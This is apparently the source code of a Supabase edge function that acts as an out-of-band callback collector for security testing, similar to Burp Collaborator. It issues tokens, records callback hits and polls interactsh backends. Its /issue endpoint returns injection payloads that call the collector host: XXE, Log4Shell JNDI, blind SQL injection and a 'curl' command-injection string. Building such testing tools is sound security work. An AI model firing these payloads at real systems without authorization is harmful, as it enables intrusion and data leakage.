// OOB callback collector — Burp Collaborator equivalent.
// Now supports THREE backends, configured per-instance via external_infra_config:
//   1. local       → callbacks routed back to this edge function (default, no setup)
//   2. oast_fun    → uses public oast.fun (interactsh) — generates token via their API
//   3. self_hosted → user-run interactsh server on their VPS with wildcard DNS
//
// Endpoints:
//   POST /oob-collector/issue   { targetId, vulnClass, payloadContext } → { token, callbackUrl }
//   ANY  /oob-collector/cb/:token                                       → records hit
//   POST /oob-collector/poll    { tokens: string[] }                    → { hits: [...] }
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
};

function db() {
  return createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!);
}

const PROJECT_URL = Deno.env.get("SUPABASE_URL")!;
const FN_BASE = `${PROJECT_URL}/functions/v1/oob-collector`;

interface OobConfig {
  mode: "local" | "oast_fun" | "self_hosted";
  endpoint_url?: string | null;
  auth_token?: string | null;
}

async function loadConfig(): Promise<OobConfig> {
  const { data } = await db().from("external_infra_config")
    .select("*").eq("service", "oob").eq("is_active", true).maybeSingle();
  if (!data) return { mode: "local" };
  const mode = ((data as any).mode as OobConfig["mode"]) || "local";
  return { mode, endpoint_url: (data as any).endpoint_url, auth_token: (data as any).auth_token };
}

/**
 * For interactsh-style backends, the callback URL is something like
 * <token>.<host>.  The host calls our edge fn /poll endpoint; we rely on
 * client-side polling here. For OOB modes other than local, we still record
 * the issued token in oob_callbacks so polling picks up hits.
 */
function buildCallbackUrl(cfg: OobConfig, token: string): string {
  if (cfg.mode === "oast_fun") return `https://${token}.oast.fun`;
  if (cfg.mode === "self_hosted" && cfg.endpoint_url) {
    const host = cfg.endpoint_url.replace(/^https?:\/\//, "").replace(/\/$/, "");
    return `https://${token}.${host}`;
  }
  return `${FN_BASE}/cb/${token}`;
}

async function pollInteractshHits(cfg: OobConfig, tokens: string[]): Promise<any[]> {
  // interactsh exposes /poll?id=<token> — public oast.fun is rate-limited.
  // For now we rely on client-issued tokens being recorded by interactsh
  // operator separately. If a self-hosted endpoint exposes an HTTP poll API,
  // we proxy to it; otherwise fall back to DB-stored hits.
  if (cfg.mode === "local") return [];
  const base = cfg.mode === "oast_fun"
    ? "https://oast.fun"
    : (cfg.endpoint_url || "").replace(/\/$/, "");
  if (!base) return [];
  const out: any[] = [];
  for (const tok of tokens.slice(0, 20)) {
    try {
      const headers: Record<string, string> = {};
      if (cfg.auth_token) headers["Authorization"] = `Bearer ${cfg.auth_token}`;
      const r = await fetch(`${base}/poll?id=${encodeURIComponent(tok)}`, {
        headers, signal: AbortSignal.timeout(12000),
      });
      if (!r.ok) continue;
      const j = await r.json().catch(() => null);
      const interactions = (j?.data as any[]) || [];
      for (const it of interactions) {
        out.push({
          token: tok,
          vuln_class: null,
          source_ip: it["remote-address"] || it.remoteAddress || null,
          user_agent: (it.headers || "").toString().slice(0, 200),
          request_method: it.protocol || "http",
          request_path: it["raw-request"] ? String(it["raw-request"]).split("\n")[0] : null,
          received_at: it.timestamp || new Date().toISOString(),
        });
      }
    } catch { /* skip */ }
  }
  return out;
}

async function requireAuth(req: Request): Promise<Response | null> {
  const auth = req.headers.get("Authorization") || "";
  const tok = auth.replace(/^Bearer\s+/i, "");
  if (tok && tok === Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")) return null;
  if (!tok) return new Response(JSON.stringify({ error: "unauthorized" }),
    { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  const supa = createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_ANON_KEY")!);
  const { data } = await supa.auth.getUser(tok);
  if (!data?.user?.id) return new Response(JSON.stringify({ error: "unauthorized" }),
    { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  return null;
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  const url = new URL(req.url);
  const path = url.pathname.replace(/^\/oob-collector/, "");

  try {
    // ── Issue token ── (auth required)
    if (path === "/issue" && req.method === "POST") {
      const unauth = await requireAuth(req); if (unauth) return unauth;
      const { targetId, findingId, vulnClass, payloadContext } = await req.json();
      const cfg = await loadConfig();
      const token = crypto.randomUUID().replace(/-/g, "").slice(0, 16);
      await db().from("oob_callbacks").insert({
        token, target_id: targetId || null, finding_id: findingId || null,
        vuln_class: vulnClass || null, payload_context: payloadContext || null,
      } as any);
      const callbackUrl = buildCallbackUrl(cfg, token);
      const host = (() => { try { return new URL(callbackUrl).host; } catch { return callbackUrl; } })();
      return new Response(JSON.stringify({
        token, callbackUrl, mode: cfg.mode,
        payloads: {
          ssrf: callbackUrl,
          xxe: `<!DOCTYPE x [<!ENTITY % a SYSTEM "${callbackUrl}"> %a;]>`,
          log4shell: `\${jndi:ldap://${host}/${token}}`,
          blindSqli: `'; SELECT pg_sleep(0)--/*${token}*/`,
          blindCmd: `; curl -s ${callbackUrl}`,
          openRedirect: callbackUrl,
        },
      }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ── Poll for hits ──
    if (path === "/poll" && req.method === "POST") {
      const { tokens } = await req.json();
      if (!Array.isArray(tokens) || tokens.length === 0) {
        return new Response(JSON.stringify({ hits: [], mode: "local" }),
          { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }
      const cfg = await loadConfig();
      // local hits from DB (covers local mode + any direct /cb hits)
      const { data: dbHits } = await db().from("oob_callbacks")
        .select("token, vuln_class, source_ip, user_agent, request_method, request_path, received_at")
        .in("token", tokens).not("received_at", "is", null);
      let allHits = dbHits || [];
      // remote interactsh hits
      if (cfg.mode !== "local") {
        const remote = await pollInteractshHits(cfg, tokens);
        // dedupe by token+received_at
        const seen = new Set(allHits.map((h: any) => `${h.token}|${h.received_at}`));
        for (const h of remote) {
          const key = `${h.token}|${h.received_at}`;
          if (!seen.has(key)) { allHits.push(h); seen.add(key); }
        }
      }
      return new Response(JSON.stringify({ hits: allHits, mode: cfg.mode }),
        { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ── Local callback receiver ──
    const cbMatch = path.match(/^\/cb\/([a-f0-9]+)/);
    if (cbMatch) {
      const token = cbMatch[1];
      const headers: Record<string, string> = {};
      req.headers.forEach((v, k) => { headers[k] = v; });
      let body = "";
      try { body = await req.text(); } catch { /* ignore */ }
      const sourceIp = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
        || req.headers.get("cf-connecting-ip") || "unknown";
      await db().from("oob_callbacks").update({
        source_ip: sourceIp,
        user_agent: req.headers.get("user-agent") || "",
        request_method: req.method,
        request_path: url.pathname + url.search,
        request_headers: headers,
        request_body: body.slice(0, 4000),
        received_at: new Date().toISOString(),
      } as any).eq("token", token);
      return new Response("ok", { headers: corsHeaders });
    }

    return new Response(JSON.stringify({ error: "unknown route", path }),
      { status: 404, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  } catch (e) {
    return new Response(JSON.stringify({ error: e instanceof Error ? e.message : "unknown" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  }
});
